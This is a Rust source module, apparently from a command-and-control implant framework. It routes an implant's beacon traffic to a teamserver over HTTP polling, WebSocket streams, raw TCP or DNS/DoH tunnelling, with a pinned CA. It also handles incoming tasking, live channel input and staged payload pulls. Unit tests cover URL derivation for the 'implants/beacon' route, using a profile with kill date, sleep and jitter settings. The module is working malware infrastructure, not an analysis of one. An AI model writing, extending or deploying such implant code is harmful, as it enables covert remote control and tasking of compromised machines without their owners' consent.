pub mod dns;
pub mod http;
pub mod rawtcp;
pub mod stream;

use std::sync::Arc;
use std::time::Duration;

use rustls::pki_types::CertificateDer;
use rustls::RootCertStore;

use crate::error::ContactError;
use crate::profile::Profile;
use crate::session::{Attempt, Session};
use crate::trust::Certificate;

/// The HTTP carriage builder the poll client rides: plain http for the
/// documented cleartext web posture (the sealed contact body carries the
/// confidentiality), https with the teamserver CA pinned for the TLS front
/// (full webpki validation against the baked CAs as the only roots, no
/// system store consulted).
pub fn build_agent(url: &str, pinned_cas: &[Certificate], timeout_seconds: f64) -> ureq::Agent {
    let mut builder =
        ureq::AgentBuilder::new().timeout(Duration::from_secs_f64(timeout_seconds.max(1.0)));
    if url.starts_with("https://") && !pinned_cas.is_empty() {
        let mut roots = RootCertStore::empty();
        for ca in pinned_cas {
            let _ = roots.add(CertificateDer::from(ca.raw.clone()));
        }
        let config = rustls::ClientConfig::builder_with_provider(Arc::new(
            rustls::crypto::ring::default_provider(),
        ))
        .with_safe_default_protocol_versions()
        .expect("rustls protocol versions")
        .with_root_certificates(roots)
        .with_no_client_auth();
        builder = builder.tls_config(Arc::new(config));
    }
    builder.build()
}

/// One contact carriage: a way to hold a contact against a front. The run
/// loop walks its egress entries and hands each to the carriage the bake's
/// mode names for the entry's URL shape; the carriage borrows the session
/// (never owns it), so cross-carriage state -- the nonce floor, the ledger,
/// the cadence -- survives every switch and reconnect.
pub trait Contact {
    /// The run loop's selector: whether this carriage serves a beacon URL
    /// under the baked mode.
    fn serves(&self, url: &str, mode: &str) -> bool;

    /// One contact attempt. `Ok(Attempt::Crossed)` means the attempt's
    /// response was processed whole; `Err(ContactError::Refused)` is a
    /// permanent answer; everything else is a dropped attempt the run loop
    /// retries on the walk.
    fn attempt(&mut self, session: &mut Session) -> Result<Attempt, ContactError>;
}

/// The beacon URL off an enroll URL: scheme and authority plus the fixed
/// envelope route, any path dropped (the teamserver maps the route; the
/// malleable profile shapes only the enroll request).
pub fn beacon_url(enroll_url: &str) -> String {
    match enroll_url.find("://") {
        Some(at) => {
            let after = &enroll_url[at + 3..];
            let authority = after.split('/').next().unwrap_or(after);
            format!("{}://{authority}/implants/beacon", &enroll_url[..at])
        }
        None => format!("https://{enroll_url}/implants/beacon"),
    }
}

/// Reads a contact response past its handshake frame: the shared body every
/// carriage serves. Channel input frames route to the live channel they
/// name (a task with no live channel is at most a completion race, and is
/// dropped); a staged task enters its pull cycle; everything else parses as
/// tasking or the frame is skipped.
pub fn accept_tasking(session: &mut Session, inbound: &[crate::wire::Frame], acks: bool) {
    use crate::wire::{ChannelInput, TaskRequest};
    use prost::Message;
    for frame in inbound {
        if frame.kind() == crate::wire::FrameKind::ChannelInput {
            if let Ok(input) = ChannelInput::decode(frame.payload.as_ref()) {
                session.channels.feed(&input.task_id, input.data, input.eof);
            }
            continue;
        }
        if let Ok(task) = TaskRequest::decode(frame.payload.as_ref()) {
            if task.staged_bytes.is_some() {
                // The poll batch defers the payload pull to its next cycle:
                // the demand rides the next request, the chunk run its
                // response.
                session.outbox.demand_staged(task);
                continue;
            }
            session.accept(&task, acks);
        }
    }
}

/// The URL this bake's carriages dial: the baked beacon front when the
/// profile names one (the split-socket shape), else the front that answered
/// the enrollment. The baked front carries scheme and authority (the dial
/// shape the server bakes); the envelope route hangs off it, so a baked
/// front without its own route gains the beacon path. The socket family's
/// dial carries no route at all -- the raw address the carriage connects
/// to, normalized to its bare authority.
pub fn dialed_beacon_url(profile: &Profile) -> String {
    // The DNS family's dial data is the zone itself, and the bake strips
    // paths off its derived beaconURL -- the very place the zone lives. So
    // the DNS dial picks whichever front CARRIES a zone (the split-socket
    // bake would name a zoned beacon front; the single-front bake carries
    // it on the enroll front), before the web families' route derivation
    // touches any path at all.
    let dns_fronts = [
        profile.beacon_url.trim_end_matches('/'),
        profile.enroll_url.trim_end_matches('/'),
    ];
    for front in dns_fronts {
        if let Some((_, _, zone)) = dns::parse_front(front) {
            if !zone.is_empty() {
                return front.to_string();
            }
        }
    }
    if profile.beacon_url.is_empty() {
        return normalize_fronts(beacon_url(&profile.enroll_url));
    }
    let baked = profile.beacon_url.trim_end_matches('/');
    normalize_fronts(if baked.contains("/implants/") {
        baked.to_string()
    } else {
        format!("{baked}/implants/beacon")
    })
}

/// The non-web families' front shapes: the socket's dial is the bare
/// tcp://authority (no route), and the DNS family's is resolver plus zone
/// (the envelope-derived path dropped for the first path segment -- the
/// zone is the dial's own data, not a route).
fn normalize_fronts(front: String) -> String {
    if let Some(rest) = front.strip_prefix("tcp://") {
        let authority = rest.split('/').next().unwrap_or(rest);
        return format!("tcp://{authority}");
    }
    for scheme in ["dns", "doh"] {
        let prefix = format!("{scheme}://");
        if let Some(rest) = front.strip_prefix(&prefix) {
            let authority = rest.split('/').next().unwrap_or(rest);
            let zone = rest[authority.len().min(rest.len())..]
                .trim_start_matches('/')
                .split('/')
                .next()
                .unwrap_or("")
                .trim_end_matches('.');
            return if zone.is_empty() {
                format!("{scheme}://{authority}")
            } else {
                format!("{scheme}://{authority}/{zone}")
            };
        }
    }
    front
}

/// The carriage the bake's front and mode name: the socket family's dial
/// picks the raw-TCP client (the mode choosing its poll or live shape),
/// otherwise poll is the default and stream the WebSocket client.
pub fn carriage_for(profile: &Profile) -> Box<dyn Contact> {
    let dial = dialed_beacon_url(profile);
    if dial.starts_with("tcp://") {
        return Box::new(rawtcp::RawTcp::new(profile));
    }
    if dial.starts_with("dns://") || dial.starts_with("doh://") {
        return match dns::Dns::new(profile) {
            Ok(carriage) => Box::new(carriage),
            // The dial is DNS-shaped by construction here, so this is a
            // bind failure: the run loop's walk treats it as a dropped
            // cycle and retries on the cadence.
            Err(_) => Box::new(http::Poll::new(profile)),
        };
    }
    match profile.mode.as_str() {
        "stream" => Box::new(stream::Stream::new(profile)),
        _ => Box::new(http::Poll::new(profile)),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn profile() -> Profile {
        Profile {
            enroll_url: "https://front.example".into(),
            beacon_url: String::new(),
            fallback_enroll_urls: Vec::new(),
            ca_pem: String::new(),
            kill_date: None,
            sleep_seconds: 30.0,
            jitter_seconds: 10.0,
            mode: "poll".into(),
            enroll_path: "/implants/enroll".into(),
            request_timeout_seconds: 30.0,
            envelope: "aesgcm".into(),
            contact_envelope: "none".into(),
            envelope_key: String::new(),
            token: String::new(),
            verbs: Vec::new(),
        }
    }

    #[test]
    fn beacon_urls_derive_the_fixed_route() {
        assert_eq!(
            beacon_url("https://front.example/shape"),
            "https://front.example/implants/beacon"
        );
        assert_eq!(
            beacon_url("tcp://host:443/ignored"),
            "tcp://host:443/implants/beacon"
        );
        assert_eq!(beacon_url("bare.host"), "https://bare.host/implants/beacon");
    }

    #[test]
    fn dialed_fronts_carry_the_non_web_families_dial_data() {
        // The DNS zone is dial data, not a route: whichever front carries
        // it wins, and the web derivation never touches it.
        let mut dns = profile();
        dns.beacon_url = "dns://resolver.example/zone.example".into();
        assert_eq!(
            dialed_beacon_url(&dns),
            "dns://resolver.example/zone.example"
        );
        let mut tcp = profile();
        tcp.enroll_url = "tcp://10.0.0.9:8443/anything".into();
        assert_eq!(dialed_beacon_url(&tcp), "tcp://10.0.0.9:8443");
        // The web families: the route derived off the front that answered,
        // or the baked split front with the route appended.
        let mut web = profile();
        web.enroll_url = "https://front.example/enroll".into();
        assert_eq!(
            dialed_beacon_url(&web),
            "https://front.example/implants/beacon"
        );
        let mut split = profile();
        split.beacon_url = "https://beacon.example".into();
        assert_eq!(
            dialed_beacon_url(&split),
            "https://beacon.example/implants/beacon"
        );
    }
}
